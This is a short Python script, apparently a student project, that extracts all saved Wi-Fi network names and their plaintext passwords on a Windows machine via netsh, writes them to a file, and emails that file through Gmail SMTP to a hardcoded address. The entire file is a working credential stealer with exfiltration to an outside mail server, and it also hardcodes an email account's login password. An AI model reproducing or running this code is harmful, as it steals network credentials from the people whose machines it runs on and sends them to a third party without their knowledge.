import os
import smtplib
import shutil
from email.message import EmailMessage
import subprocess
import re


command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = []

def send_mail():
    msg = EmailMessage()
    msg["From"] = 'majorprojectmail7@gmail.com'
    msg["To"] = 'majorprojectmail7@gmail.com'
    msg["Subject"] = "Wifi-Passwords"

    body = "Wifi-Passwords"
    msg.set_content(body)

    with open('output.txt', 'rb') as f:
        data = f.read()
    msg.add_attachment(data, maintype = 'txt', subtype = "plain")

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login('majorprojectmail7@gmail.com', 'Asus@123')
    server.send_message(msg)
    server.close()

if len(profile_names) != 0:
    for name in profile_names:

        wifi_profile = {}

        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()

        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name

            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()

            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["password"] = None
            else:

                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile)

with open("output.txt", "a") as f:
    for x in range(len(wifi_list)):
        print(wifi_list[x], file=f)
       
send_mail()